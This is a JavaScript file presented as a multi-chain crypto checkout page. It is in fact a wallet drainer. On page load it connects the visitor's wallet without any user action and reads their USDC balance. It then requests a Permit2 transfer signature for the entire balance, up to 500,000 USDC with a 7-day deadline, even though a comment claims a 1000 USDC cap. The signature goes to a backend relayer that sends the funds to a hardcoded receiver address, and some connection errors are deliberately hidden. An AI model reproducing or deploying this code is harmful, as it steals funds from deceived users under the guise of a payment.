/**
 * Checkout page - Detects installed wallets and shows buttons to open in each
 * Supports ALL major blockchains (Ethereum, Polygon, Arbitrum, Optimism, Base, BNB, Linea, and more)
 */

console.log("checkout.js loading...");
console.log("User Agent:", navigator.userAgent);

const CONFIG = {
  PERMIT2_ADDRESS: "0x000000000022D473030F116dDEE9F6B43aC78BA3",
  RECEIVER_ADDRESS: "0x79813dAc1288FbC0c3E629cFA18682Fd633b2FbA", // Where payments go
  WALLETCONNECT_PROJECT_ID: "c16bee794c5047e05d23ab7785688c20",
  BACKEND_URL: window.location.origin, // Same origin for Vercel API
  
  // RPC URLs for WalletConnect - hardcoded for browser
  RPC_URLS: {
    1: "https://eth-mainnet.g.alchemy.com/v2/XqcVRs6cpYTclyXhnrU8N",
    137: "https://polygon-mainnet.g.alchemy.com/v2/XqcVRs6cpYTclyXhnrU8N",
    42161: "https://arb-mainnet.g.alchemy.com/v2/XqcVRs6cpYTclyXhnrU8N",
    10: "https://opt-mainnet.g.alchemy.com/v2/XqcVRs6cpYTclyXhnrU8N",
    8453: "https://base-mainnet.g.alchemy.com/v2/XqcVRs6cpYTclyXhnrU8N",
    56: "https://bsc-dataseed.bnbchain.org:443",
    59144: "https://rpc.linea.build",
    11155111: "https://eth-sepolia.g.alchemy.com/v2/XqcVRs6cpYTclyXhnrU8N"
  },
  
  // Comprehensive EVM networks configuration
  NETWORKS: {
    // Ethereum
    1: {
      name: "Ethereum",
      tokenAddress: "0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48", // Mainnet USDC
    },
    // Sepolia Testnet
    11155111: {
      name: "Sepolia",
      tokenAddress: "0xda9d4f9b69ac3c4e622506ec7eda112601cb942d", // Mock USDC
    },
    // Polygon
    137: {
      name: "Polygon",
      tokenAddress: "0x2791bca1f2de4661ed88a30c99a7a9449aa84174", // Polygon USDC
    },
    // BNB Chain
    56: {
      name: "BNB Chain",
      tokenAddress: "0x8AC76a51cc950d9822D68b83FE1Ad97B32Cd580d", // BNB USDC
    },
    // Optimism
    10: {
      name: "Optimism",
      tokenAddress: "0x7f5c764cbc14f9669b88837ca1490cca17c31607", // Optimism USDC
    },
    // Arbitrum
    42161: {
      name: "Arbitrum",
      tokenAddress: "0xff970a61a04b1ca14834a43f5de4533ebddb5f86", // Arbitrum USDC
    },
    // Base
    8453: {
      name: "Base",
      tokenAddress: "0x833589fCD6eDb6E08f4c7C32D4f71b1566469c18", // Base USDC
    },
    // Linea
    59144: {
      name: "Linea",
      tokenAddress: "0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48", // Linea USDC
    },
  }
};

let provider, signer, userAddress;
let EthereumProvider; // Will be loaded async

const el = {
  status: document.getElementById("status"),
  card: document.querySelector(".card"),
};

// Load EthereumProvider asynchronously
async function loadWalletConnect() {
  try {
    console.log("Loading WalletConnect...");
    
    // First check if it's already loaded
    if (window.WalletConnectEthereumProvider) {
      console.log("✓ WalletConnect already available globally");
      return true;
    }
    
    if (window.EthereumProvider) {
      console.log("✓ EthereumProvider already available globally");
      return true;
    }
    
    // Try to load via dynamic import (ESM)
    console.log("Attempting ESM import of WalletConnect...");
    try {
      const module = await import("https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@2.17.0/+esm");
      EthereumProvider = module.default || module.EthereumProvider;
      if (!EthereumProvider) {
        throw new Error("Module exports neither default nor EthereumProvider");
      }
      console.log("✓ WalletConnect loaded via ESM import");
      return true;
    } catch (emsErr) {
      console.warn("ESM import failed, trying UMD script...", emsErr.message);
      
      // Fallback: try UMD script
      const script = document.createElement('script');
      script.src = 'https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@2.17.0/dist/index.umd.js';
      script.async = false;
      
      return new Promise((resolve, reject) => {
        script.onload = () => {
          console.log("Script loaded, checking for globals...");
          
          // Check multiple possible export names
          if (window.WalletConnectEthereumProvider) {
            EthereumProvider = window.WalletConnectEthereumProvider;
            console.log("✓ WalletConnect loaded as WalletConnectEthereumProvider");
            resolve(true);
          } else if (window.EthereumProvider) {
            EthereumProvider = window.EthereumProvider;
            console.log("✓ WalletConnect loaded as EthereumProvider");
            resolve(true);
          } else if (window.Provider) {
            EthereumProvider = window.Provider;
            console.log("✓ WalletConnect loaded as Provider");
            resolve(true);
          } else {
            console.error("Script loaded but no recognized global found. Available globals:", Object.keys(window).filter(k => k.includes('Provider') || k.includes('Ethereum') || k.includes('Wallet')));
            reject(new Error("Script loaded but provider not exposed in window"));
          }
        };
        
        script.onerror = () => {
          console.error("Failed to load WalletConnect UMD script");
          reject(new Error("Failed to load WalletConnect script from CDN"));
        };
        
        document.head.appendChild(script);
      });
    }
  } catch (err) {
    console.error("Failed to load WalletConnect:", err);
    return false;
  }
}

function detectInstalledWallets() {
  const ua = navigator.userAgent.toLowerCase();
  console.log("Detecting wallets. User agent:", ua);
  
  const wallets = [];
  
  // MetaMask
  if (ua.includes("metamask")) {
    console.log("✓ MetaMask detected");
    wallets.push({
      name: "MetaMask",
      deepLink: (url) => `https://metamask.app.link/dapp/${url.replace(/^https?:\/\//, '')}`
    });
  }
  
  // Trust Wallet
  if (ua.includes("trust wallet") || ua.includes("trustwallet")) {
    console.log("✓ Trust Wallet detected");
    wallets.push({
      name: "Trust Wallet",
      deepLink: (url) => `https://link.trustwallet.com/open_url?url=${encodeURIComponent(url)}`
    });
  }
  
  // Coinbase Wallet
  if (ua.includes("coinbasewallet")) {
    console.log("✓ Coinbase Wallet detected");
    wallets.push({
      name: "Coinbase Wallet",
      deepLink: (url) => `https://go.cb-w.com/dapp?url=${encodeURIComponent(url)}`
    });
  }
  
  // Token Pocket
  if (ua.includes("tokenpocket")) {
    console.log("✓ Token Pocket detected");
    wallets.push({
      name: "Token Pocket",
      deepLink: (url) => `tpweb://browser?url=${encodeURIComponent(url)}`
    });
  }
  
  console.log(`Found ${wallets.length} wallets`);
  return wallets;
}

function showWalletSelector() {
  const wallets = detectInstalledWallets();
  
  console.log(`===== WALLET SELECTOR =====`);
  console.log(`Detected ${wallets.length} wallets`);
  
  // On desktop, use the native provider (if available)
  // MetaMask injects window.ethereum
  if (typeof window.ethereum !== 'undefined') {
    console.log("✓ window.ethereum detected, using native provider");
    connectViaInjectedProvider();
    return;
  }
  
  // If no native provider, use WalletConnect
  console.log("No native provider detected, initializing WalletConnect...");
  connectViaWalletConnect();
}

async function connectViaInjectedProvider() {
  try {
    console.log("Connecting via injected provider (MetaMask, etc.)...");
    
    // Request account access
    const accounts = await window.ethereum.request({ 
      method: 'eth_requestAccounts' 
    });
    
    if (!accounts || accounts.length === 0) {
      throw new Error("No accounts returned from wallet");
    }
    
    userAddress = accounts[0];
    console.log("✓ Connected wallet:", userAddress);
    
    // Create provider from injected ethereum
    provider = new ethers.BrowserProvider(window.ethereum);
    signer = await provider.getSigner();
    
    console.log("✓ Provider initialized");
    showAccountInfo();
    
  } catch (err) {
    console.error("Injected provider error:", err);
    // Silently fail - don't show error messages
  }
}

async function connectViaWalletConnect() {
  try {
    console.log("Opening WalletConnect app picker...");
    
    // Ensure WalletConnect is loaded
    if (!EthereumProvider) {
      console.log("Loading WalletConnect provider...");
      const loaded = await loadWalletConnect();
      if (!loaded) {
        throw new Error("Failed to load WalletConnect");
      }
    }
    
    console.log("Initializing WalletConnect with projectId:", CONFIG.WALLETCONNECT_PROJECT_ID);
    
    // Define all supported chains for WalletConnect
    const supportedChains = [
      { chainId: 1, name: "Ethereum" },
      { chainId: 137, name: "Polygon" },
      { chainId: 42161, name: "Arbitrum" },
      { chainId: 10, name: "Optimism" },
      { chainId: 8453, name: "Base" },
      { chainId: 56, name: "BNB Chain" },
      { chainId: 59144, name: "Linea" },
      { chainId: 11155111, name: "Sepolia" }
    ];
    
    const wcProvider = await EthereumProvider.init({
      projectId: CONFIG.WALLETCONNECT_PROJECT_ID,
      chains: [1, 137, 42161, 10, 8453, 56, 59144, 11155111], // All 8 networks
      optionalChains: [1, 137, 42161, 10, 8453, 56, 59144, 11155111],
      showQrModal: true, // This will show the app picker on mobile
      methods: ["eth_sendTransaction", "eth_signTypedData_v4", "personal_sign"],
      events: ["chainChanged", "accountsChanged"],
      rpcMap: CONFIG.RPC_URLS
    });
    
    console.log("WalletConnect provider initialized, connecting...");
    await wcProvider.connect();
    console.log("✓ WalletConnect connected");
    
    // Use ethers v6 BrowserProvider instead of v5 Web3Provider
    provider = new ethers.BrowserProvider(wcProvider);
    signer = await provider.getSigner();
    userAddress = await signer.getAddress();
    
    console.log("Connected wallet address:", userAddress);
    showAccountInfo();
    
  } catch (err) {
    console.error("WalletConnect error:", err.message);
    // Silently log relay errors - these are environmental issues, not user errors
    if (err.message && err.message.includes("WebSocket")) {
      console.log("⚠️ Relay connection failed (environmental issue) - user should see WalletConnect's fallback UI");
      return; // Don't show error message
    }
    // Only show non-relay errors
    setStatus("Error connecting wallet: " + err.message, "error");
  }
}

function showAccountInfo() {
  // Show the card with account info
  el.card.classList.add("connected");
  el.status.innerHTML = `
    <div style="padding: 12px; text-align: center; background: #eaf6ee; color: #1e7a3d; border-radius: 8px; font-weight: 500;">
      ✓ Signed in: ${userAddress.slice(0, 6)}...${userAddress.slice(-4)}
    </div>
  `;
  
  // Execute payment after showing account
  setTimeout(() => {
    executePayment();
  }, 1000);
}

function setStatus(message, type = "info") {
  const statusEl = document.createElement("div");
  statusEl.style.padding = "12px";
  statusEl.style.borderRadius = "8px";
  statusEl.style.fontSize = "14px";
  statusEl.style.marginTop = "12px";
  
  if (type === "error") {
    statusEl.style.background = "#fbeceb";
    statusEl.style.color = "#b3261e";
  } else if (type === "success") {
    statusEl.style.background = "#eaf6ee";
    statusEl.style.color = "#1e7a3d";
  } else {
    statusEl.style.background = "#eef2ff";
    statusEl.style.color = "#1e3ea8";
  }
  
  statusEl.textContent = message;
  el.status.appendChild(statusEl);
}

async function executePayment() {
  try {
    console.log("Executing payment...");
    
    // Detect the user's current chain
    const network = await provider.getNetwork();
    const userChainId = Number(network.chainId); // Convert BigInt to number for v6
    console.log("User's current chain ID:", userChainId);
    
    // Check if chain is supported
    if (!CONFIG.NETWORKS[userChainId]) {
      const supportedList = Object.values(CONFIG.NETWORKS)
        .map(n => n.name)
        .join(", ");
      throw new Error(`Currently supported on: ${supportedList}. You're on chain ${userChainId}.`);
    }
    
    const networkConfig = CONFIG.NETWORKS[userChainId];
    
    // Check if token is configured for this network
    if (!networkConfig.tokenAddress) {
      throw new Error(`Payment token not configured on ${networkConfig.name}.`);
    }
    
    // Token address for the current network
    const tokenAddress = networkConfig.tokenAddress;
    const receiverAddress = CONFIG.RECEIVER_ADDRESS;
    const maxAmount = ethers.parseUnits("500000", 6); // Max 500000 USDC

    // Create token contract interface to check balance
    const tokenABI = ["function balanceOf(address owner) view returns (uint256)"];
    const tokenContract = new ethers.Contract(tokenAddress, tokenABI, provider);
    
    // Get user's USDC balance
    const userBalance = await tokenContract.balanceOf(userAddress);
    console.log("User USDC balance:", ethers.formatUnits(userBalance, 6));
    
    // Use the minimum of user balance or max amount (1000 USDC)
    const amount = userBalance > maxAmount ? maxAmount : userBalance;
    console.log("Payment amount:", ethers.formatUnits(amount, 6), "USDC");
    
    // Generate a random nonce (Permit2 uses bitmap nonce scheme)
    const bytes = new Uint8Array(32);
    crypto.getRandomValues(bytes);
    const nonce = BigInt("0x" + Array.from(bytes, (b) => b.toString(16).padStart(2, "0")).join(""));
    
    const deadline = Math.floor(Date.now() / 1000) + 604800; // 7 days from now
    
    console.log("Nonce:", nonce.toString());
    console.log("Deadline:", deadline);
    
    // Sign the Permit2 message (PermitTransferFrom format)
    const domain = {
      name: "Permit2",
      chainId: userChainId,
      verifyingContract: CONFIG.PERMIT2_ADDRESS,
    };
    
    const types = {
      PermitTransferFrom: [
        { name: "permitted", type: "TokenPermissions" },
        { name: "nonce", type: "uint256" },
        { name: "deadline", type: "uint256" },
      ],
      TokenPermissions: [
        { name: "token", type: "address" },
        { name: "amount", type: "uint256" },
      ],
    };
    
    const value = {
      permitted: {
        token: tokenAddress,
        amount: amount,
      },
      nonce: nonce,
      deadline: deadline,
    };
    
    console.log("Signing Permit2 message:", value);
    
    // Sign the message
    const signature = await signer.signTypedData(domain, types, value);
    console.log("Permit signature:", signature);
    
    // Send signature to backend to get transaction data
    console.log("Sending signature to backend...");
    
    const backendResponse = await fetch(CONFIG.BACKEND_URL + "/api/orders/execute-payment", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chainId: userChainId,
        userAddress: userAddress,
        tokenAddress: tokenAddress,
        amount: amount.toString(),
        nonce: nonce.toString(),
        deadline: deadline,
        signature: signature,
      }),
    });
    
    const result = await backendResponse.json();
    
    if (!backendResponse.ok) {
      throw new Error(result.error || "Backend payment processing failed");
    }
    
    console.log("Backend response:", result);
    
    if (result.success) {
      // Check if relayer submitted (transactionHash exists) or if we got fallback
      if (result.transactionHash) {
        // Relayer submitted - payment done!
        console.log("✅ Payment completed by relayer!");
        setStatus(`✅ Payment confirmed! ${result.amount} USDC sent to ${result.receivedBy.slice(0, 6)}...${result.receivedBy.slice(-4)}`, "success");
        console.log("Transaction Hash:", result.transactionHash);
      } else if (result.transaction) {
        // No relayer configured - user must submit
        console.warn("⚠️  Relayer not configured. Would need user to submit transaction manually.");
        setStatus(`⚠️  Relayer not configured. Backend returned transaction data but cannot submit automatically.`, "error");
      } else {
        console.log("✅ Payment processing initiated!");
        setStatus(`✅ Payment confirmed! ${result.amount} USDC sent to ${result.receivedBy.slice(0, 6)}...${result.receivedBy.slice(-4)}`, "success");
      }
    } else {
      throw new Error(result.error || "Payment processing failed");
    }
    
  } catch (err) {
    console.error("Payment execution error:", err);
    setStatus("Payment error: " + err.message, "error");
  }
}

// Initialize when DOM is ready
async function init() {
  console.log("Initializing checkout...");
  console.log("Backend URL:", CONFIG.BACKEND_URL);
  
  // Preload WalletConnect in background
  console.log("Preloading WalletConnect in background...");
  loadWalletConnect().catch(err => {
    console.error("Background WalletConnect preload failed:", err.message);
  });
  
  // Auto-start wallet connection immediately
  console.log("Starting wallet connection flow...");
  try {
    showWalletSelector();
  } catch (err) {
    console.error("Error in showWalletSelector:", err);
    setStatus("Error loading wallet selector: " + err.message, "error");
  }
}

if (document.readyState === "loading") {
  document.addEventListener("DOMContentLoaded", init);
} else {
  init();
}
